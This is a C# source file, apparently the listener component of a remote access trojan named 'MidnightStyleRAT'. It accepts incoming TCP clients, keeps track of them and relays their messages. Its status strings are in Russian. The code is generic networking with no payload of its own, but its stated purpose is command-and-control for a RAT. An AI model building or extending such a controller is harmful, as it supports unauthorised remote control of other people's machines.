﻿using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace MidnightStyleRAT
{
    public class TcpServer
    {
        private TcpListener server;
        private Thread serverThread;
        private bool isRunning;
        private List<TcpClientHandler> clients = new List<TcpClientHandler>();

        public event Action<string> ServerMessageReceived;
        public event Action<TcpClientHandler> ClientConnected;
        public event Action<TcpClientHandler> ClientDisconnected;
        public event Action<TcpClientHandler, string> ClientMessageReceived;


        public void StartServer(int port)
        {
            if (isRunning) return;

            server = new TcpListener(IPAddress.Any, port);
            server.Start();
            isRunning = true;

            serverThread = new Thread(() =>
            {
                try
                {
                    while (isRunning)
                    {
                        if (server.Pending())
                        {
                            TcpClient tcpClient = server.AcceptTcpClient();
                            var clientHandler = new TcpClientHandler(tcpClient);

                            lock (clients)
                            {
                                clients.Add(clientHandler);
                            }

                            clientHandler.MessageReceived += (TcpClientHandler c, string msg) =>
                            {
                                ClientMessageReceived?.Invoke(c, msg);
                            };

                            clientHandler.ClientDisconnected += (TcpClientHandler c) =>
                            {
                                lock (clients)
                                {
                                    clients.Remove(c);
                                }
                                ClientDisconnected?.Invoke(c);
                            };

                            ClientConnected?.Invoke(clientHandler);
                            clientHandler.Start();
                        }
                        else
                        {
                            Thread.Sleep(100);
                        }
                    }
                }
                catch (Exception ex)
                {
                    ServerMessageReceived?.Invoke("Ошибка сервера: " + ex.Message);
                }
            });

            serverThread.IsBackground = true;
            serverThread.Start();
        }

        public void StopServer()
        {
            isRunning = false;

            lock (clients)
            {
                foreach (var client in clients)
                {
                    client.SendMessage("Сервер отключается");
                }
                clients.Clear();
            }

            server?.Stop();
        }

        public List<TcpClientHandler> GetClients()
        {
            lock (clients)
            {
                return new List<TcpClientHandler>(clients);
            }
        }
    }
}
